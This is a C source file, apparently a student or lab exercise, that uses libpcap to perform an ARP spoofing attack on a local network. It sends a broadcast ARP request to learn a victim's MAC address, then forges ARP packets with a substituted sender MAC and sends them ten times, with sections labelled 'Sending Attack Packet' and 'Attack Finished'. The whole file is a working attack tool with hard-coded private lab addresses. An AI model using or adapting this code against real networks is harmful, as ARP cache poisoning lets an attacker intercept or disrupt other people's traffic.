#include <stdio.h>
#include <stdlib.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <stdint.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#define ETHERNET_SIZE 14
struct ETHERNET_HEADER{
    u_int8_t Destination_Mac[6];
    u_int8_t Source_Mac[6];
    u_int16_t Ether_Type;
};

struct ARP_HEADER{

    u_int16_t Mac_Type;
    u_int16_t IP_Type;
    u_int8_t Mac_Add_Len;
    u_int8_t IP_Add_Len;
    u_int16_t Opcode;
    u_int8_t Sender_Mac[6];
    struct in_addr Sender_IP;
    u_int8_t Target_Mac[6];
    struct in_addr Target_IP;
};

	/*
	char* abc = "192.168.32.1";
	struct	in_addr kk;
	printf("gogodo\n");
	inet_pton(AF_INET, abc, &kk.s_addr);
	printf("%lu\n", kk.s_addr);
	printf("goood\n");*/

int main(int argc, char* argv[])
{
	char* dev;
	char* errbuf[PCAP_ERRBUF_SIZE];
	char* SourceMac;
	struct ETHERNET_HEADER *ethernet;
	struct ARP_HEADER *arp;
	char *sender_ip = "192.168.127.135";
	char *target_ip = "192.168.127.131";
	struct in_addr sender;
	struct in_addr target;
	int i = 0;
	int res;
	struct bpf_program *fp;
	struct pcap_pkthdr *header;

	u_char* rev_packet;
	pcap_t *handle;
	u_char packet[42];
	u_char* temp;

	ethernet = (struct ETHERNET_HEADER*)malloc(sizeof(struct ETHERNET_HEADER));
	arp = (struct ARP_HEADER *)malloc(sizeof(struct ARP_HEADER));

	dev = pcap_lookupdev(errbuf);
	printf("%s\n", dev);
	if(dev == NULL){
	
		printf("Can't Found Device\n");
		exit(1);
	}

	handle = pcap_open_live(dev, BUFSIZ, 0, -1, errbuf);
	
	//////////////////////////////////////////////
	//////Making Packet to know Victim's MAC//////
	//////////////////////////////////////////////
	//////////Victim's IP : 192.168.43.204////////
	//////////////////////////////////////////////
	for (i = 0; i < 6; i++) {
		packet[i] = 0xff;
	}
	packet[6] = 0x00;
	packet[7] = 0x0c;
	packet[8] = 0x29;
	packet[9] = 0xac;
	packet[10] = 0x4c;
	packet[11] = 0xee;
	packet[12] = 0x08;
	packet[13] = 0x06;
	
	packet[14] = 0x00;
    packet[15] = 0x01;
	packet[16] = 0x08;
    packet[17] = 0x00;
        
	packet[18] = 0x06;
    packet[19]= 0x04;
	packet[20] = 0x00;
    packet[21] = 0x01;
    packet[22] = 0x00;
	packet[23] = 0x0c;
	packet[24] = 0x29;
	packet[25] = 0xac;
	packet[26] = 0x4d;
	packet[27] = 0xee;

       /*
	inet_pton(AF_INET, sender_ip, &sender.s_addr);
	arp->Sender_IP = sender;
    */
    packet[28] = 192;
    packet[29] = 168;
    packet[30] = 127;
    packet[31] = 135;
           
	packet[32] = 0x00;
	packet[33] = 0x00;
	packet[34] = 0x00;
	packet[35] = 0x00;
	packet[36] = 0x00;
	packet[37] = 0x00;
    /*
	inet_pton(AF_INET, target_ip, &target.s_addr);
	arp->Target_IP = target;
    */
	packet[38] = 192;
    packet[39] = 168;
    packet[40] = 127;
    packet[41] = 131;
	


	///////////////////////////////////////////////////////
	//////////////////Catch Packet/////////////////////////
	///////////////////////////////////////////////////////

	printf("Compile\n");	
	//pcap_compile(handle, &fp, "ARP", 0, 0);
	printf("SetFilter\n");
//	pcap_setfilter(handle, &fp);
	
	while(1){
		pcap_sendpacket(handle, packet,42);
		res=pcap_next_ex(handle, &header, &rev_packet);
		
		if(res == 0){
			continue;
		}
		else if(res == -1 || res == -2){
			printf("res = -1 or -2 \n");
			break;
		}else{
			ethernet = (struct ETHERNET_HEADER *)(rev_packet);
			arp = (struct ARP_HEADER *)(rev_packet+ETHERNET_SIZE);
			printf("%d\n", arp->Opcode);
			if(arp->Opcode == 512){
				printf("Find..!!\n");
				break;
			}
				
		
		}

	}



	////////////////////////////////////////////////////////////
	/////////////////////Sending Attack Packet//////////////////
	////////////////////////////////////////////////////////////

	for(i=0; i<6; i++){
		packet[i] = ethernet->Source_Mac[i];
		packet[32+i] = ethernet->Source_Mac[i];
	}

	

	packet[22] = 0x00;
	packet[23] = 0x50;
	packet[24] = 0x56;
	packet[25] = 0xf6;
	packet[26] = 0x51;
	packet[27] = 0x61;
	for(i=0; i<10; i++){
	pcap_sendpacket(handle, packet,42);
	}
	printf("Attack Finished..!\n");

	return 0;
}

